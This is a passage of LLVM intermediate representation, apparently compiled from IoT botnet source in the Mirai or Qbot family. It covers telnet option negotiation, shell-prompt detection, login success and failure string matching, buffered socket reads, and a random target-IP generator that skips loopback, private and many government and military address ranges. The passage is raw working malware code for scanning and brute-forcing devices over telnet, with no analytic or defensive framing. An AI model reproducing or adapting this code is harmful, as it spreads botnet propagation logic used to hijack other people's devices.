  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #6, !srcloc !5
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %5, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %6) #6
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #6
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #6
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #6
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #6
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #6
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #6
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_state(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #10 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.fd_set, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #6, !srcloc !6
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.fd_set* nonnull %9, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %10) #6
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #6
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #6
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #14
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #6
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @GIP.ipState.0, align 1
  %5 = tail call i32 @rand() #6
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @GIP.ipState.1, align 1
  %8 = tail call i32 @rand() #6
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @GIP.ipState.2, align 1
  %11 = tail call i32 @rand() #6
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @GIP.ipState.3, align 1
  %14 = load i8, i8* @GIP.ipState.0, align 1
  switch i8 %14, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 25, label %.critedge.backedge
    i8 49, label %.critedge.backedge
    i8 50, label %.critedge.backedge
    i8 -119, label %.critedge.backedge
    i8 6, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 -41, label %.critedge.backedge
    i8 -64, label %15
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %15, %18, %26, %29, %32, %37, %44, %48, %52, %55, %58, %63, %66, %69, %72, %77, %80, %83, %86, %89, %93, %96, %106, %109, %121, %127, %133, %140, %156, %162, %168, %174, %180, %186, %192, %203, %208, %212, %217, %222, %228, %234, %240, %246, %251, %255, %260, %266, %271, %282, %288, %294, %300, %306, %311, %317, %324, %330, %336, %343, %346, %352, %355, %358, %361, %364, %368, %371, %375, %381, %397, %410, %418, %426, %435, %443, %451, %460, %469, %477, %485, %493, %501, %510, %518, %526, %535, %543, %547, %552, %558, %567, %575, %583, %591, %599, %607, %616, %624, %632, %640, %649, %652, %657, %660, %663, %666, %669, %672, %676, %680, %683, %686, %691, %697, %706, %714, %722, %730, %739, %748, %756, %764, %772, %780, %789, %797, %805, %813, %828, %837, %843, %850, %856, %862, %869, %875, %882, %888, %891, %898, %911, %920, %926, %932, %944, %946, %954, %960, %963, %969, %975, %980, %146, %151, %99, %114, %195, %274, %385, %400, %816, %901, %935, %972
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @GIP.ipState.1, align 1
  %17 = icmp eq i8 %16, -88
  br i1 %17, label %.critedge.backedge, label %18

; <label>:18:                                     ; preds = %.critedge, %15
  %19 = load i8, i8* @GIP.ipState.0, align 1
  %20 = icmp eq i8 %19, -110
  %21 = load i8, i8* @GIP.ipState.1, align 1
  %22 = icmp eq i8 %21, 17
  %23 = icmp eq i8 %21, 80
  %or.cond222703 = or i1 %22, %23
  %24 = icmp eq i8 %21, 98
  %or.cond224704 = or i1 %24, %or.cond222703
  %25 = icmp eq i8 %21, -102
  %or.cond226705 = or i1 %25, %or.cond224704
  %or.cond678 = and i1 %20, %or.cond226705
  br i1 %or.cond678, label %.critedge.backedge, label %26

; <label>:26:                                     ; preds = %18
  %27 = icmp eq i8 %19, -109
  %28 = icmp eq i8 %21, -97
  %or.cond228 = and i1 %27, %28
  br i1 %or.cond228, label %.critedge.backedge, label %29

; <label>:29:                                     ; preds = %26
  %30 = icmp eq i8 %19, -108
  %31 = icmp eq i8 %21, 114
  %or.cond230 = and i1 %30, %31
  br i1 %or.cond230, label %.critedge.backedge, label %32

; <label>:32:                                     ; preds = %29
  %33 = icmp eq i8 %19, -106
  %34 = icmp eq i8 %21, 125
  %35 = icmp eq i8 %21, -123
  %or.cond234706 = or i1 %34, %35
  %36 = icmp eq i8 %21, -112
  %or.cond236707 = or i1 %36, %or.cond234706
  %or.cond680 = and i1 %33, %or.cond236707
  br i1 %or.cond680, label %.critedge.backedge, label %37

; <label>:37:                                     ; preds = %32
  %38 = icmp eq i8 %21, -107
  %39 = or i8 %21, 8
  %40 = icmp eq i8 %39, -99
  %41 = icmp eq i8 %21, -72
  %or.cond242709 = or i1 %41, %40
  %42 = icmp eq i8 %21, -66
  %or.cond244710 = or i1 %42, %or.cond242709
  %43 = icmp eq i8 %21, -60
  %or.cond246711 = or i1 %43, %or.cond244710
  %or.cond684 = and i1 %33, %or.cond246711
  br i1 %or.cond684, label %.critedge.backedge, label %44

; <label>:44:                                     ; preds = %37
  %45 = icmp eq i8 %19, -104
  %46 = icmp eq i8 %21, 82
  %47 = icmp eq i8 %21, -27
  %or.cond250712 = or i1 %46, %47
  %or.cond685 = and i1 %45, %or.cond250712
  br i1 %or.cond685, label %.critedge.backedge, label %48

; <label>:48:                                     ; preds = %44
  %49 = icmp eq i8 %19, -99
  %50 = icmp eq i8 %21, -54
  %51 = icmp eq i8 %21, -39
  %or.cond254713 = or i1 %50, %51
  %or.cond686 = and i1 %49, %or.cond254713
  br i1 %or.cond686, label %.critedge.backedge, label %52

; <label>:52:                                     ; preds = %48
  %53 = icmp eq i8 %19, -95
  %54 = icmp eq i8 %21, 124
  %or.cond256 = and i1 %53, %54
  br i1 %or.cond256, label %.critedge.backedge, label %55

; <label>:55:                                     ; preds = %52
  %56 = icmp eq i8 %19, -94
  %57 = icmp eq i8 %21, 32
  %or.cond258 = and i1 %56, %57
  br i1 %or.cond258, label %.critedge.backedge, label %58

; <label>:58:                                     ; preds = %55
  %59 = icmp eq i8 %19, -101
  %60 = icmp eq i8 %21, 96
  %or.cond262714 = or i1 %60, %38
  %61 = icmp eq i8 %21, -101
  %or.cond264715 = or i1 %61, %or.cond262714
  %62 = icmp eq i8 %21, -78
  %or.cond266716 = or i1 %62, %or.cond264715
  %or.cond689 = and i1 %59, %or.cond266716
  br i1 %or.cond689, label %.critedge.backedge, label %63

; <label>:63:                                     ; preds = %58
  %64 = icmp eq i8 %19, -92
  %65 = icmp eq i8 %21, -98
  %or.cond268 = and i1 %64, %65
  br i1 %or.cond268, label %.critedge.backedge, label %66

; <label>:66:                                     ; preds = %63
  %67 = icmp eq i8 %19, -100
  %68 = icmp eq i8 %21, 9
  %or.cond270 = and i1 %67, %68
  br i1 %or.cond270, label %.critedge.backedge, label %69

; <label>:69:                                     ; preds = %66
  %70 = icmp eq i8 %19, -89
  %71 = icmp eq i8 %21, 44
  %or.cond272 = and i1 %70, %71
  br i1 %or.cond272, label %.critedge.backedge, label %72

; <label>:72:                                     ; preds = %69
  %73 = icmp eq i8 %19, -88
  %74 = icmp eq i8 %21, 68
  %75 = icmp eq i8 %21, 85
  %or.cond276717 = or i1 %74, %75
  %76 = icmp eq i8 %21, 102
  %or.cond278718 = or i1 %76, %or.cond276717
  %or.cond691 = and i1 %73, %or.cond278718
